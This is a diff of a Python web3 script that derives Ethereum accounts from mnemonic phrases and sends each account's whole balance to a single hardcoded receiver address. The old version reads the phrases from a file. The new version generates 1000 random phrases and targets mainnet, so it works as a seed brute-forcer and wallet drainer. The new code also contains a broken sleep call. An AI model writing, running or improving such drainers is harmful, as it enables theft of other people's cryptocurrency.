@@ -1,98 +1,82 @@
 from web3 import Web3
 from mnemonic import Mnemonic
 from eth_account import Account
-import json
+import time
 
-# Connect to the Ethereum node
-node_url = 'http://node.masnet.ai:8545'
+# Connect to Ethereum mainnet via public node
+node_url = 'https://rpc.ankr.com/eth'  # Public mainnet node
 web3 = Web3(Web3.HTTPProvider(node_url))
 
 Account.enable_unaudited_hdwallet_features()
 
-# Check if connected to the node
 if not web3.is_connected():
-    raise Exception("Failed to connect to the Ethereum node")
+    raise Exception("Failed to connect to Ethereum mainnet")
+print("Connected to Ethereum mainnet")
 
-print("Connected to Ethereum node")
-
-# Define the receiver address
+# Receiver address
 receiver_address = '0x64669F88Fd2cE75A2448C7F41B78e0bb6b79ce19'
 
-# Define gas and gas price
+# Transaction parameters
 gas_limit = 21000
-gas_price = web3.to_wei('1', 'gwei')
-chain_id = 220315  # Use the appropriate chain ID for your network
+gas_price = web3.to_wei('20', 'gwei')  # Adjust based on mainnet network
+chain_id = 1  # Ethereum mainnet
 
-# Initialize total transferred amount
 total_transferred = 0
-
-# Initialize Mnemonic instance
 mnemo = Mnemonic("english")
 
-# Read mnemonic phrases from file
-with open('mas_tes.txt', 'r') as file:
-    mnemonic_phrases = [line.strip() for line in file]
+# Generate 1000 random 12-word mnemonic phrases
+mnemonic_phrases = [mnemo.generate(strength=128) for _ in range(1000)]
 
-for mnemonic_phrase in mnemonic_phrases:
+for idx, mnemonic_phrase in enumerate(mnemonic_phrases, 1):
     try:
-        # Validate mnemonic phrase
-        if not mnemo.check(mnemonic_phrase):
-            print(f"Invalid mnemonic phrase: {mnemonic_phrase}")
-            continue
-
-        # Generate seed from mnemonic phrase
-        seed_bytes = mnemo.to_seed(mnemonic_phrase)
-
-        # Generate the account from the seed
+        # Generate account
+        sleep(0.5)
         acct = Account.from_mnemonic(mnemonic_phrase)
         sender_address = acct.address
-        private_key = acct.key
+        private_key = acct.key if hasattr(acct, 'key') else acct.privateKey
 
-        print(f"Derived sender address: {sender_address}")
+        print(f"[{idx}] Sender: {sender_address}")
 
-        # Get the balance of the sender address
-        balance = web3.eth.get_balance(sender_address)
-
-        print(f"Balance for {sender_address}: {web3.from_wei(balance, 'ether')} ETH")
-
-        # Calculate the total transaction cost
-        transaction_fee = gas_limit * gas_price
-
-        # Check if balance is sufficient
-        if balance <= transaction_fee:
-            print(f"Insufficient funds for address {sender_address}. Balance: {web3.from_wei(balance, 'ether')} ETH")
+        # Fetch balance safely
+        try:
+            balance = web3.eth.get_balance(sender_address)
+        except Exception as e:
+            print(f"[{idx}] Cannot get balance (skipped): {e}")
             continue
 
-        # Calculate the amount to send (available balance - transaction fee)
-        amount_to_send = balance - transaction_fee
+        print(f"[{idx}] Balance: {web3.from_wei(balance, 'ether')} ETH")
 
-        # Get the nonce (transaction count for the sender address)
+        transaction_fee = gas_limit * gas_price
+
+        # Skip addresses with insufficient funds
+        if balance <= transaction_fee:
+            print(f"[{idx}] Insufficient funds. Skipping")
+            continue
+
+        amount_to_send = balance - transaction_fee
         nonce = web3.eth.get_transaction_count(sender_address)
 
-        # Define the transaction
+        # Create transaction
         tx = {
             'nonce': nonce,
             'to': receiver_address,
-            'value': amount_to_send,  # Amount to send (in wei)
+            'value': amount_to_send,
             'gas': gas_limit,
             'gasPrice': gas_price,
-            'chainId': chain_id,  # Include chain ID
+            'chainId': chain_id
         }
 
-        # Sign the transaction
-        signed_tx = Account.sign_transaction(tx, private_key)
-
-        # Send the transaction
+        # Sign and send transaction
+        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
         tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
-
-        # Update total transferred amount
         total_transferred += amount_to_send
 
-        # Get the transaction hash
-        print(f"Transaction from {sender_address} sent with hash: {tx_hash.hex()}")
+        print(f"[{idx}] Transaction sent: {tx_hash.hex()}")
+
+        # Throttle requests to avoid overloading the public node
+        time.sleep(0.1)  # 100ms delay
 
     except Exception as e:
-        print(f"Error processing mnemonic phrase: {mnemonic_phrase}. Error: {e}")
+        print(f"[{idx}] General error: {e}")
 
-# Print the total transferred amount after processing all transactions
-print(f"Total amount transferred: {web3.from_wei(total_transferred, 'ether')} ETH")
+print(f"Total transferred: {web3.from_wei(total_transferred, 'ether')} ETH")
